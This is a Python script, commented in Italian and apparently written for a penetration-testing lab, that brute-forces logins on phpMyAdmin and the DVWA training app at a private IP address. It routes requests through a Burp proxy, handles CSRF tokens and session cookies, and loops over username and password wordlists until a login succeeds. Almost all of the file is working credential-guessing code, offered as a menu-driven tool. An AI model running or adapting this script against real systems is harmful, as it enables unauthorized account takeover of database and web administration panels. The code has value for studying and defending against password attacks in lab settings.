#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

#inserire qui l'ip dell'host da attaccare
host = "192.168.50.101"

#burpsuite è necessario che sia aperto perchè il codice funzioni, perchè tutte le richieste vengono inoltrete tramite lui, volendo si possono modificare le richieste rimuovendo il parametro "proxies"
proxies = {
	"http": "http://127.0.0.1:8080"
}

#testato e funziona
def check_phpMyAdmin_credentials(URL, username, password):    
	# -- first request to get CSRF code and cookie value
	r1 = requests.get(URL, proxies=proxies)
	soup = BeautifulSoup(r1.text, 'html.parser')
    	
	cookie = soup.find("input", {"name": "phpMyAdmin"})["value"] 
	token = soup.find("input", {"name": "token"})["value"]
	
	# -- second request to check creds    
	data = f"pma_username={username}&pma_password={password}&server=1&token={token}"
    
	custom_headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie": f"pma_lang=en-utf-8; pma_charset=utf-8; pma_theme=original; pma_fontsize=82%25; phpMyAdmin={cookie}",
	}

	r2 = requests.post(URL, headers=custom_headers, data=data, proxies=proxies, allow_redirects=False)
	# estraggo i cookies usr e pass
	pmaUser = r2.cookies.get('pmaUser-1')
	pmaPass = r2.cookies.get('pmaPass-1')
	
	custom_headers1 = {
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie": f"pma_lang=en-utf-8; pma_charset=utf-8; pma_theme=original; pma_fontsize=82%25; phpMyAdmin={cookie}; pmaUser-1={pmaUser}; pmaPass-1={pmaPass}",
	}	
	
	
	# -- third request to follow redirect
	#lgetURL = f"{URL}?token={token}"
	# forse modificare pmaUser-1 e pass che sono crittati dalla richiesta 2
	r3 = requests.get(URL, headers=custom_headers1, proxies=proxies, params = {"token": token})
	
	if "loginform" in r3.text:
		return False
	else:
		return True
		
# testato e funziona		
def check_DVWA_credentials(URL, username, password):
	
	data = {
		'username': username,
		'password': password,
		'Login': 'Login'
	}
	# Effettua la richiesta POST per il login
	r1 = requests.post(url, data=data, proxies=proxies, allow_redirects=False)
	phpsess = r1.cookies.get('PHPSESSID')
	sec = r1.cookies.get('security')
	custom_headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie": f"security={sec}; PHPSESSID={phpsess}",
	}
	r2 = requests.get(url, headers=custom_headers, proxies=proxies)
	# Verifica lo stato della risposta
	#if response.status_code == 302 and response.headers.get('location').endswith('index.php'):

	if "Login failed" in r2.text:
		return False
	else:
		return True
		
	
#inserire qui altri metodi per altri siti

	
def prntMenu():
	ok = False
	#metodo per richiedere in input il target (DVWA o phpMyAdmin)
	# stampo il menù (possibile espandere i siti target)
	print("Quale sito vuoi bruteforzare?: ")
	print("1) phpMyAdmin")
	print("2) DVWA login")

	# aggiungi qui altri siti
	while not ok:
		try:
			menu = int(input("Inserisci qui il tuo numero: "))
			# estendere questo range se si aggiungono opzioni
			if menu in range(1,3):
				ok = True
			else:
				print("Inserisci solo i numeri del menù")
		except:
			print("Inserisci solo numeri")	
	return menu
	
def insTarget(sito):
	url = ""
	if sito == 1:
		url = f"http://{host}/phpMyAdmin/index.php"
	elif sito == 2:
		url = f"http://{host}/dvwa/login.php"
	
	
	# inserire altri elif per aggiungere siti target
	else:
		print("Errore URL")
	
	return url
	




def loadFiles():
	nUsr = True
	nPass = True
	#questo ciclo non serve più, era per far si che l'utente continuasse a provare il nome del file, usando il default non è più necessario
	while(nUsr):
		try:
			#provo ad aprire il file che mi da in input
			username_file = open(input("Inserisci il nome del file che contiene gli Username da provare (Premere invio per quello di Default): "))
			nUsr = False
		except:
			#se mi da errore uso quello di default
			print("File Username non Trovato! Uso quello di default")
			# file di nmap, path completo: /usr/share/nmap/nselib/data/usernames.lst
			username_file = open("usernames.lst")
			nUsr = False

	while(nPass):
		try:
			#provo ad aprire il file che mi da in input
			password_file = open(input("Inserisci il nome del file che contiene le password (Premere invio per quello di Default): "))
			nPass = False
		except:
			#se mi da errore uso quello di default
			print("File Password non Trovato! Uso quello di default")
			# file di nmap, path completo: /usr/share/nmap/nselib/data/passwords.lst
			password_file = open("passwords.lst")
			nPass = False
			
	# -- read wordlists files
	usernames = []

	usernames = username_file.read().splitlines()
	username_file.close()
	
	passwords = []

	passwords = password_file.read().splitlines()
	password_file.close()
		
	return usernames, passwords
	
# --------------------------
# Execution starts here

if __name__ == "__main__":
	# -- example
	# print(check_credentials("username", "password"))
    	
	menu = prntMenu()
	usernames = []
	passwords = []
	usernames, passwords = loadFiles()
	url = insTarget(menu)

	# -- for each user
	for user in usernames:
		# -- and for each password
		for password in passwords:
			# -- in base al sito attaccato uso un metodo specifico
			if menu == 1:
				if check_phpMyAdmin_credentials(url, user, password):
					# se lo trovo smetto
					print(f"Login Riuscito con: ({user}:{password})")
					break
				else:
					print(f"Login fallito con: ({user}:{password})")
			elif menu == 2:
				if check_DVWA_credentials(url, user, password):
					print(f"Login Riuscito con: ({user}:{password})")
					break
				else:
					print(f"Login fallito con: ({user}:{password})")


			# aggiungere qui altri check di metodi specifici
			else:
				print("Errore nel menù")
		else:
			continue
		break
